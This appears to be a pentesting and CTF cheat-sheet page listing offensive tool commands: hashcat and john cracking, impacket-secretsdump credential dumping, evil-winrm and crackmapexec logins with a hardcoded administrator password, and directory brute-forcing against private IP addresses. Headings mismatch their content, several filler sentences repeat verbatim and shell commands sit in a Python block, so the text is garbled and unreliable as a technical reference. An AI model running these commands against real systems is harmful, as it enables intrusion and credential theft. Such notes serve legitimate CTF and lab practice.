---
TitleSEO: "Common CTF Tricks and Techniques | ZureFX"
TitlePost: "Common CTF Tricks and Techniques"
Author: "ZureFX"
Description: "Personal notes on Common CTF Tricks and Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, persistence, malware, networking"
URL: "https://zurefx.github.io/notes/note-common-ctf-tricks-and-techniques-394.html"
URL_IMAGES: ""
Date: "2025-04-20"
Tags: "Cheatsheet, Persistence, Malware, Networking"
Section: "notes"
Lang: "en"
main_img: "note-common-ctf-tricks-and-techniques-394"
Permalink: "/notes/note-common-ctf-tricks-and-techniques-394.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Resource-Based Constrained Delegation

### Writable PATH

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.126.83
gobuster dir -u http://10.111.118.212/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Telnet

### Python

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.81.226.170 -u administrator -p 'P@ssw0rd!'
```

```python
gobuster dir -u http://10.113.226.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p5985,21,445 10.17.223.94 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.35.122.214/FUZZ
feroxbuster -h
```

```bash
crackmapexec smb 10.83.76.97 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.11.51.147/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Sudo Misconfiguration

### CORS Misconfiguration

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

- `gobuster`
- `ACL Abuse`
- `SUID Binary`
- `NTLM Relay`
- `wpscan`

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

## AS-REP Roasting

### rubeus

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.74.71.21/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.29.33.28/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

- `LAPS Abuse`
- `chisel`
- `Cron Job`

## IIS

### Django

- `hydra`
- `Subdomain Takeover`
- `dcomexec`

> **Note:** Writable PATH was identified as the primary attack vector in this scenario.

- `Docker Escape`
- `hydra`
- `XSS`
- `ldapsearch`
- `john`

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

## CSRF

### NTLM Relay

```bash
crackmapexec smb 10.99.199.23 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

- `dcomexec`
- `Pass the Hash`
- `Kerberoasting`
- `wpscan`
- `Silver Ticket`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.73.141.180
evil-winrm -i 10.123.212.214 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.26.162.130 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.92.244.138/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
